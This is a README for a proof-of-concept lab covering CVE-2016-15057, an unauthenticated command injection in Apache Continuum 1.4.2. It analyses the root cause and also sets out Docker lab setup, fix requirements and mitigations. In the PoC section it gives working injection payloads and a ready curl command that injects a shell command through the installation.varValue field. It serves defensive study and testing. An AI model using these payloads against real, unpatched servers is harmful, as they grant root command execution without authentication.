# CVE-2016-15057 - Apache Continuum Unauthenticated Command Injection

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2016-15057 |
| Component | [Apache Continuum](https://github.com/apache/continuum) -- Continuous Integration Server |
| Type | CWE-77: Command Injection |
| CVSS | 9.9 (Critical) -- `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| EPSS | 37.9% (97.1st percentile) |
| Affected | All versions up to and including 1.4.2 (retired project) |
| Fix | None -- Apache Continuum is retired; no patch will be released |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

> **Note**: While CVSS assigns PR:L (low privileges), the vulnerability analysis confirms the injection is **pre-auth** -- it fires during the Struts2 validation phase before the authorization interceptor runs. Effective CVSS should be PR:N.

## Vulnerability Details

Apache Continuum 1.4.2 (and all prior versions) contains a critical unauthenticated OS command injection vulnerability in the `saveInstallation.action` Struts2 endpoint. User-supplied input in the `installation.varValue` parameter is passed unsanitized to a shell command execution sink (`/bin/sh -c`), allowing a remote attacker to execute arbitrary commands as the server process user -- typically root in containerized deployments. The injection occurs during the Struts2 validation phase, **before** the authorization interceptor, making it exploitable without any authentication.

Apache Continuum is a **retired project** with no fix available.

### Root Cause

The vulnerability has two compounding flaws that together enable unauthenticated remote code execution:

**Flaw 1 -- Command Injection (CWE-77):** The `installation.varValue` POST parameter is intended to hold a filesystem path (e.g., `JAVA_HOME`). During input validation, `InstallationValidator.validate()` calls `DefaultInstallationService.getExecutorConfiguratorVersion()`, which concatenates the user-supplied value directly into a shell command (e.g., `<varValue>/bin/java -version`). This command is executed via plexus-utils `Commandline` -> `CommandLineUtils.executeCommandLine()`, which on Linux wraps execution in `/bin/sh -c`, enabling shell metacharacter interpretation. Both backtick (`` `cmd` ``) and dollar-paren (`$(cmd)`) substitution syntax trigger arbitrary command execution.

**Flaw 2 -- Pre-Auth Execution via Interceptor Ordering (CWE-863):** The Struts2 interceptor stack (`configuredContinuumStack`) orders the `defaultStack` interceptor -- which includes the validation phase -- **before** the `redbackSecureActions` authorization interceptor. The shell command executes during validation (step 3 in the stack), and the authorization check (step 5) is never reached because validation errors short-circuit the interceptor chain.

Additionally, the regex validator for `varValue` allows `$`, `(`, and `)` characters, meaning `$(command)` substitution passes validation cleanly. Even for characters rejected by the regex (like backticks), the custom `installationValidator` still fires because `short-circuit="true"` is not set on the regex validator.

### Vulnerable Code Path

```
POST /continuum/saveInstallation.action
  -> Struts2 Interceptor Stack (configuredContinuumStack):
    1. redbackForceAdminUser     -- check admin exists (pass)
    2. redbackAutoLogin          -- auto-login from cookie (pass, no-op)
    3. defaultStack              -- includes VALIDATION:
       -> InstallationValidator.validate()
         -> installationService.getExecutorConfiguratorVersion(varValue, ...)
           -> Commandline.setExecutable("<varValue>/bin/java")
             -> CommandLineUtils.executeCommandLine()
               -> /bin/sh -c '"<varValue>/bin/java" -version'
               -> SHELL INTERPRETS $(cmd) or `cmd` -> RCE
    4. redbackSecureActions      -- AUTHORIZATION (never reached)
```

### Key Source Files

| File | Role |
|------|------|
| `InstallationValidator.java` | Triggers command execution during validation (line 79) |
| `DefaultInstallationService.java` | Constructs shell command from user input (lines 404-466) |
| `DefaultShellCommandHelper.java` | Low-level command execution sink (lines 55-67) |
| `InstallationAction.java` | Struts action entry point (lines 126-171) |
| `struts.xml` | Interceptor stack ordering (lines 85-104) |
| `InstallationAction-saveInstallation-validation.xml` | Regex + custom validator config |

## Lab Setup

### Architecture

```
+-----------------------------------------+
|  cve-2016-15057-vulnerable              |
|  Apache Continuum 1.4.2                 |
|  +-------------------------------+      |
|  |  Jetty 8.1.7 (port 8080)     |      |
|  |  +-- Struts2 webapp           |      |
|  |  |   +-- /continuum/*        |      |
|  |  +-- Embedded Derby DB        |      |
|  +-------------------------------+      |
|  Azul Zulu OpenJDK 7 (1.7.0_352)       |
|  Tanuki Java Service Wrapper 3.2.3      |
+-----------------------------------------+
```

### Quick Start

```bash
cd CVE-2016-15057
docker compose up -d
```

The application takes ~60-90 seconds to start (longer on arm64 due to QEMU emulation):

```bash
# Poll health status
docker inspect cve-2016-15057-vulnerable --format '{{.State.Health.Status}}'
# Wait until: healthy
```

### Container Details

| Container | Image | Role | Port |
|-----------|-------|------|------|
| `cve-2016-15057-vulnerable` | `cve-2016-15057-vulnerable` | Apache Continuum 1.4.2 (Zulu JDK 7 + embedded Jetty) | `18080 -> 8080` |

### Credentials

| Username | Password | Notes |
|----------|----------|-------|
| `admin` | `admin123` | Auto-created by entrypoint setup script |

> The admin user is created automatically on first boot. The vulnerability does **not** require authentication, but the initial setup wizard must have been completed (the entrypoint handles this).

### Stop Lab

```bash
docker compose down
```

## PoC Usage

### Get the Target IP

```bash
CONTAINER_IP=$(docker inspect cve-2016-15057-vulnerable \
  --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "Target: http://${CONTAINER_IP}:8080"
```

### Vector 1: `$(command)` Substitution (Primary -- passes regex)

```bash
python3 poc/poc.py $CONTAINER_IP 8080
```

**Expected Output:**
```
[*] Step 2: Injecting command via $(command) substitution
    Endpoint: POST /continuum/saveInstallation.action
    Payload:  installation.varValue=$(id > /tmp/cve_2016_15057_proof ...)
    Response: HTTP 200 (7155 bytes)

[+] COMMAND INJECTION CONFIRMED!
[+] Proof file contents (/tmp/cve_2016_15057_proof):
    uid=0(root) gid=0(root) groups=0(root)

[*] Time-based verification: injecting $(sleep 5)
    Response time: 5.2s (expected >= 5s if vulnerable)
[+] Time-based injection confirmed!

[+] VULNERABILITY CONFIRMED: CVE-2016-15057
```

### Vector 2: Backtick Injection (bypasses non-short-circuit regex)

```bash
python3 poc/poc_vector2_backtick.py $CONTAINER_IP 8080
```

### Vector 3: Multiple Installation Types (jdk, maven2, maven1, ant)

```bash
python3 poc/poc_vector3_multi_type.py $CONTAINER_IP 8080
```

### Manual cURL Verification

```bash
# Inject command (file-based proof)
curl -X POST "http://${CONTAINER_IP}:8080/continuum/saveInstallation.action" \
  --data-urlencode "installation.name=test" \
  --data-urlencode "installation.type=jdk" \
  --data-urlencode 'installation.varValue=$(id > /tmp/pwned)'

# Read proof file from container
docker exec cve-2016-15057-vulnerable cat /tmp/pwned
# Expected: uid=0(root) gid=0(root) groups=0(root)
```

## Verification: Vulnerable vs Patched

### Vulnerable (Apache Continuum 1.4.2)

```
$ python3 poc/poc.py $CONTAINER_IP 8080

[+] COMMAND INJECTION CONFIRMED!
[+] Proof file contents (/tmp/cve_2016_15057_proof):
    uid=0(root) gid=0(root) groups=0(root)
    CVE-2016-15057
    Sat Feb 28 05:23:18 PM UTC 2026

[+] Time-based injection confirmed! Response delayed by ~5.2s

[+] VULNERABILITY CONFIRMED: CVE-2016-15057
    Unauthenticated command injection in Apache Continuum 1.4.2
    Vector: $(command) substitution in installation.varValue
    Execution context: uid=0(root) gid=0(root) groups=0(root)
```

### Patched

**No patched version exists.** Apache Continuum is a retired project. The only mitigation is to decommission all Continuum instances.

If Continuum must remain running temporarily:
- Block access to `/continuum/saveInstallation.action` at the reverse proxy / WAF level
- Restrict network access to the Continuum web interface to trusted IPs only
- Do **not** expose Continuum to the internet under any circumstances

## Fix

### No Upstream Fix Available

Apache Continuum was **retired** before a fix could be released. JIRA issue [CONTINUUM-2769](https://issues.apache.org/jira/browse/CONTINUUM-2769) was filed on June 30, 2016, targeting version 1.5.1, but that version was never released.

### What a Proper Fix Would Require

1. **Input validation**: Whitelist `varValue` to only allow valid filesystem path characters -- reject shell metacharacters (`` ` ``, `$`, `(`, `)`, `{`, `}`, `;`, `|`, `&`, `<`, `>`, `'`, `"`, `!`, newlines)
2. **Interceptor reordering**: Move `redbackSecureActions` (authorization) BEFORE `defaultStack` (validation) in the `configuredContinuumStack` interceptor stack, so auth is checked before any command execution
3. **Safe command execution**: Replace plexus-utils `Commandline` (which uses `/bin/sh -c` wrapping) with `ProcessBuilder` using explicit argument arrays that prevent shell interpretation
4. **Fix regex validator**: Add `short-circuit="true"` and remove `$`, `(`, `)`, `{`, `}` from the allowed character set

### Recommended Mitigation

- **Decommission Apache Continuum** -- migrate to an actively maintained CI/CD system (Jenkins, GitLab CI, GitHub Actions, etc.)
- If immediate decommission is not possible, apply network-level restrictions to block access to the vulnerable endpoint

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC -- `$(command)` substitution with file-write + timing verification |
| `poc/poc_vector2_backtick.py` | Backtick (`` ` ``) command substitution variant |
| `poc/poc_vector3_multi_type.py` | Multi-type PoC -- tests all 4 installation types (jdk, maven2, maven1, ant) |
| `Dockerfile.vulnerable` | Apache Continuum 1.4.2 with Azul Zulu JDK 7 |
| `docker-compose.yml` | Lab orchestration |
| `entrypoint.sh` | Container entrypoint -- starts wrapper + setup script |
| `setup-continuum.sh` | Auto-completes admin setup wizard on first boot |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab construction details |
| `poc_verification_report.md` | PoC test results |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2016-15057)
- [GitHub Advisory (GHSA-77p9-w6pj-rmvg)](https://github.com/advisories/GHSA-77p9-w6pj-rmvg)
- [Apache Mailing List](https://lists.apache.org/thread/hbvf1ztqw2kv51khvzm5nk3mml3nm4z1)
- [oss-security](http://www.openwall.com/lists/oss-security/2026/01/26/1)
- [JIRA (unfixed)](https://issues.apache.org/jira/browse/CONTINUUM-2769)
- [Apache Security Page](https://continuum.apache.org/security.html)
- [ExploitDB-39886 (Original PoC)](https://www.exploit-db.com/exploits/39886)
- [ExploitDB-39945 (Metasploit)](https://www.exploit-db.com/exploits/39945)
- [Metasploit Module](https://www.rapid7.com/db/modules/exploit/linux/http/apache_continuum_cmd_exec/)
- [Source Code (GitHub)](https://github.com/apache/continuum)
- [Binary Archive](https://archive.apache.org/dist/continuum/binaries/)

## Timeline

| Date | Event |
|------|-------|
| 2016-06-06 | Original disclosure and PoC published (ExploitDB-39886) |
| 2016-06-14 | Metasploit module published (ExploitDB-39945) |
| 2016-06-30 | JIRA CONTINUUM-2769 filed (target fix: 1.5.1) |
| -- | Apache Continuum retired -- version 1.5.1 never released |
| 2026-01-26 | CVE-2016-15057 assigned (oss-security) |
| 2026-02-28 | PoC developed and verified in isolated lab environment |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2016-15057 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
